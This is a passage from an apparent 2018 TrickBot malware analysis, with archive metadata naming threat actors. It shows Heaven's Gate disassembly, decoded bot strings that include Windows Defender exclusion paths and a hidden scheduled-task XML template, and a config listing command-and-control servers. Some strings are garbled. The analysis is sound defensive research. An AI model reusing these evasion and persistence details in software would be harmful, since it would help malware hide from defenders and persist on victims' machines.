mapped into memory at 0x100000 and then some hardcoded data is mapped into an executable region of memory which will kick off loading the bot into a new process. Before it gets there however it performs a little trick where it does a far jump into 64 bit code, what happens at the call instruction is completely dependent on which debugger you are using. This technique is commonly refered to as ‘Heavens Gate’ with a far call to 0x33:addr which switches the execution over to 64 bit because we are running in WOW64[3,4].\n00470000  55        PUSH EBP\n00470001  89E5       MOV EBP,ESP\n00470003  83E4 F0     AND ESP,FFFFFFF0\n00470006  9A 11004700 3300 CALL FAR 0033:00470011          ; Far call\n0047000D  89EC       MOV ESP,EBP\n0047000F  5D        POP EBP\n00470010  C3        RETN\n00470011  48        DEC EAX\n00470012  83EC 20     SUB ESP,20\n00470015  E8 061AB90F   CALL 10001A20\n0047001A  48        DEC EAX\n0047001B  83C4 20     ADD ESP,20\n0047001E  CB        RETF                   ; Far return\n\n```\n\n-----\n\n### Decoded bot EXE that is injected has the same string encoding as the loader layer did so this decoded EXE is the TrickBot the previous layer is probably TrickLoader but it’s been changed to be position independent bytecode with function obfuscation to hide itself and further protect the bot EXE.\n\n Decoded bot strings:\n\n\n-----\n\n```\nLoadUserProfileW\nDestroyEnvironmentBlock\nCreateEnvironmentBlock\nUSERENV.dll\nGetAdaptersInfo\nIPHLPAPI.dll\nNtQueryInformationProcess\nntdll.dll\nPathFindExtensionW\nPathRemoveFileSpecW\nPathRemoveBackslashW\nStrStrIW\nPathRenameExtensionW\nPathAddBackslashW\nPathFindFileNameW\nSHLWAPI.dll\nCryptBinaryToStringW\nCryptStringToBinaryW\nCRYPT32.dll\nCoUninitialize\nCoCreateInstance\nole32.dll\nSetSecurityDescriptorDacl\nInitializeSecurityDescriptor\nCopySid\nGetLengthSid\nSetEntriesInAclW\nGetSecurityInfo\nSetSecurityInfo\nSetNamedSecurityInfoW\nRegSetValueExW\nRegOpenKeyExW\nRegCloseKey\nRegCreateKeyExW\nRevertToSelf\nAdjustTokenPrivileges\nLookupPrivilegeValueW\nCryptGetHashParam\nCryptAcquireContextW\nCryptSetKeyParam\nCryptReleaseContext\nConvertStringSecurityDescriptorToSecurityDescriptorW\nCryptImportKey\nCryptCreateHash\nCryptDecrypt\nCryptDestroyHash\nCryptHashData\nCryptDestroyKey\nAllocateAndInitializeSid\nFreeSid\nOpenProcessToken\nEqualSid\nCreateProcessAsUserW\nDuplicateTokenEx\nLookupAccountSidW\nGetTokenInformation\nGetUserNameW\nADVAPI32.dll\nCreateToolhelp32Snapshot\nProcess32NextW\nProcess32FirstW\nMultiByteToWideChar\nWideCharToMultiByte\nGetModuleHandleA\nQueryPerformanceCounter\nGetCurrentThreadId\nSetUnhandledExceptionFilter\nU h dl dE ti Filt\n\n```\n\n-----\n\n```\nGetCurrentProcessId\nGetSystemTimeAsFileTime\nGetCurrentProcess\nGetVersionExW\nGetVersion\nSetFilePointer\nWriteFile\nReadFile\nCreateFileW\nlstrcmpiW\nGetTempFileNameW\nCreateProcessW\nMoveFileExW\nGetTickCount\nInitializeCriticalSectionAndSpinCount\nSleep\nGetFileAttributesW\nGetModuleFileNameW\nGetStartupInfoW\nGetTempPathW\nMoveFileW\nSetCurrentDirectoryW\nDeleteFileW\nlstrcpyW\nLocalFree\nCreateMutexW\nResumeThread\nWriteProcessMemory\nDuplicateHandle\nCreateEventW\nGetExitCodeThread\nVirtualAllocEx\nVirtualProtectEx\nTerminateProcess\nReadProcessMemory\nVirtualFreeEx\nOpenProcess\nCreateRemoteThread\nSetEvent\nCreateDirectoryW\nSetFileAttributesW\nlstrcmpA\nLoadLibraryA\nGetFileTime\nFindNextFileW\nGetSystemInfo\nLockResource\nFindClose\nGetLastError\nlstrcpynW\nSetFileTime\nGetModuleHandleW\nLoadResource\nFreeLibrary\nFindResourceW\nFindFirstFileW\nGetFullPathNameW\nlstrlenW\nlstrcmpW\nGetComputerNameW\nCreateThread\nDEBG\nMACHINE\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Paths\nMACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths\nMACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\nWinDefend\n%08lX%04lX%lu\n  ki\n\n```\n\n-----\n\n```\np\nlastver\nModuleQuery\nLeaveCriticalSection\nEnterCriticalSection\nInitializeCriticalSection\nVERS\nSignatureLength\nECCPUBLICBLOB\nECDSA_P384\nspam.dnsbl.sorbs.net\ndnsbl-1.uceprotect.net\nb.barracudacentral.org\ncbl.abuseat.org\nzen.spamhaus.org\nGetNativeSystemInfo\nModule is not valid\nclient_id\n1032\n/plain/clientip\n/text\n/raw\n/plain\nip.anysrc.net\nwtfismyip.com\nmyexternalip.com\nicanhazip.com\napi.ipify.org\nipinfo.io\nipecho.net\ncheckip.amazonaws.com\nssert\nD:(A;;GA;;;WD)(A;;GA;;;BA)(A;;GA;;;SY)(A;;GA;;;RC)\nGlobal\\Muta\n--%s---%s\nContent-Disposition: form-data; name=\"%S\"\nContent-Type: multipart/form-data; boundary=%s\nContent-Length: %d\n------Boundary%08X\nwinsta0\\default\nWTSQueryUserToken\nWTSGetActiveConsoleSessionId\nWTSFreeMemory\nWTSEnumerateSessionsA\nwtsapi32\nGetProcAddress\nLoadLibraryW\nExitProcess\nResetEvent\nCloseHandle\nWaitForSingleObject\nSignalObjectAndWait\nsvchost.exe\nRelease\nFreeBuffer\nControl\nStart\nLoad to M failed\nRun D failed\nLoad to P failed\nFind P failed\nC t ZP f il d\n\n```\n\n-----\n\n```\n          y\nparentfiles\nperiod\nfile\nconf\ncontrol\nneedinfo\nautocontrol\nautoconf\nprocessname\nautostart\n<moduleconfig>*</moduleconfig>\n%s%s\n%s%s_configs\\\nModules\\\nHeapReAlloc\nHeapFree\nGetProcessHeap\nHeapAlloc\nkernel32.dll\n0.0.0.0\nPOST\nInternetCanonicalizeUrlW\nWininet\nBCryptDestroyKey\nBCryptCloseAlgorithmProvider\nBCryptVerifySignature\nBCryptGetProperty\nBCryptImportKeyPair\nBCryptOpenAlgorithmProvider\nNCryptFreeObject\nNCryptDeleteKey\nNCryptImportKey\nNCryptOpenStorageProvider\nBcrypt.dll\nNcrypt.dll\n%s %s SP%d\nUnknown\nWindows 2000\nWindows XP\nWindows Server 2003\nWindows Vista\nWindows Server 2008\nWindows 7\nWindows Server 2008 R2\nWindows 8\nWindows Server 2012\nWindows 8.1\nWindows Server 2012 R2\nWindows 10\nWindows 10 Server\nMozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0\npsrv\nplugins\nexpir\nservconf\n%s_W%d%d%d.\nModule already unloaded\nControl failed\nModule was unloaded\nProcess has been finished\nrelease\nStart failed\nProcess was unloaded\nGetParentInfo error\nUnable to load module from server\nstart\nDecode from BASE64 error\nWi 32\n\n```\n\n-----\n\n```\n     p\nNo params\ninfo\ndata\n%s/%s/64/%s/%s/%s/\nnoname\n%s/%s/63/%s/%s/%s/%s/\n/%s/%s/25/%s/\n/%s/%s/23/%d/\n/%s/%s/14/%s/%s/0/\n/%s/%s/10/%s/%s/%d/\n/%s/%s/5/%s/\n/%s/%s/1/%s/\n/%s/%s/0/%s/%s/%s/%s/%s/\nname\nmodule\nMsNetMonitor\n%s.%s.%s.%s\n%s.%s\n%Y-%m-%dT%H:%M:%S\n</UserId>\n<UserId>\n<LogonType>InteractiveToken</LogonType>\n<RunLevel>LeastPrivilege</RunLevel>\n<RunLevel>HighestAvailable</RunLevel>\n<GroupId>NT AUTHORITY\\SYSTEM</GroupId>\n<LogonType>InteractiveToken</LogonType>\n</LogonTrigger>\n<LogonTrigger>\n<Enabled>true</Enabled>\n</Command>\n</Exec>\n</Actions>\n</Task>\n</Principal>\n</Principals>\n<Settings>\n<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n<AllowHardTerminate>false</AllowHardTerminate>\n<StartWhenAvailable>true</StartWhenAvailable>\n<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n<IdleSettings>\n<StopOnIdleEnd>true</StopOnIdleEnd>\n<RestartOnIdle>false</RestartOnIdle>\n</IdleSettings>\n<AllowStartOnDemand>true</AllowStartOnDemand>\n<Enabled>true</Enabled>\n<Hidden>true</Hidden>\n<RunOnlyIfIdle>false</RunOnlyIfIdle>\n<WakeToRun>false</WakeToRun>\n<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n<Priority>7</Priority>\n</Settings>\n<Actions Context=\"Author\">?ps� pp?</StartBoundary> �\n<Enabled>true</Enabled>\n<ScheduleByDay>\n<DaysInterval>1</DaysInterval>\n</ScheduleByDay>\n</CalendarTrigger>\n</Triggers>\n<Principals>\n<Principal id=\"Author\">\n\n```\n\n-----\n\n```\n       gg\n<Repetition>\n<Interval>PT3M</Interval>\n<Duration>P1D</Duration>\n<StopAtDurationEnd>false</StopAtDurationEnd>\n</Repetition>\n<StartBoundary>\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\"\nxmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n<RegistrationInfo>\n<Version>1.0.1</Version>\n<Description>System service monitor.</Description>\n<URI>\\Task</URI>\n</RegistrationInfo>\n<Triggers>\nSYSTEM\n%s sTart\ngroup_tag\nCONFIG\nuser\nconfig.conf\n.tmp\n%s %s\nSINJ\nnot listed\nlisted\nDNSBL\nclient is not behind NAT\nclient is behind NAT\nfailed\nNAT status\npublic.bin\nConfigsAndKeys\\\n\n### Decoding the config out of the bot EXE hasn’t changed.\n\n Initial bot config:\n<mcconf><ver>1000158</ver><gtag>ser0328</gtag><servs><srv>109.95.113.130:449</srv>\n<srv>87.101.70.109:449</srv><srv>31.134.60.181:449</srv><srv>85.28.129.209:449</srv>\n<srv>82.214.141.134:449</srv><srv>81.227.0.215:449</srv><srv>31.172.177.90:449</srv>\n<srv>185.55.64.47:449</srv><srv>78.155.199.225:443</srv><srv>92.63.103.193:443</srv>\n<srv>85.143.175.248:443</srv><srv>185.159.129.31:443</srv><srv>194.87.237.178:443</srv>\n<srv>195.123.216.12:443</srv><srv>54.38.56.154:443</srv><srv>82.146.60.85:443</srv>\n<srv>185.228.232.139:443</srv></servs><autorun><module name=\"systeminfo\" ctl=\"GetSystemInfo\"/><module\nname=\"injectDll\"/></autorun></mcconf>\n\n References:\n\n 1. https://labsblog.f-secure.com/2017/12/18/dont-let-an-auto-elevating-bot-spoil-your-christmas/ 2. http://www.kernelmode.info/forum/viewtopic.php?f=16&t=4869&p=31078&hilit=icedid#p31078 3. http://www.hexacorn.com/blog/2015/10/26/heavens-gate-and-a-chameleon-code-x8664/ 4. https://blog.malwarebytes.com/threat-analysis/2018/01/a-coin-miner-with-a-heavens-gate/ 5. https://github.com/hfiref0x/UACME/blob/143ead4db6b57a84478c9883023fbe5d64ac277b/Source/Akagi/sup.c#L77\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-04-16 - TrickBot & UACME.pdf"
    ],
    "report_names": [
        "2018-04-16 - TrickBot & UACME.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536134,
    "ts_updated_at": 1743041124,
    "ts_creation_date": 1653774065,
    "ts_modification_date": 1653774065,
    "files": {
        "pdf": "https://archive.orkl.eu/5939fd35434e2a4cb510511f5dd5668d79a3c2c6.pdf",
        "text": "https://archive.orkl.eu/5939fd35434e2a4cb510511f5dd5668d79a3c2c6.txt",
        "img": "https://archive.orkl.eu/5939fd35434e2a4cb510511f5dd5668d79a3c2c6.jpg"
    }
}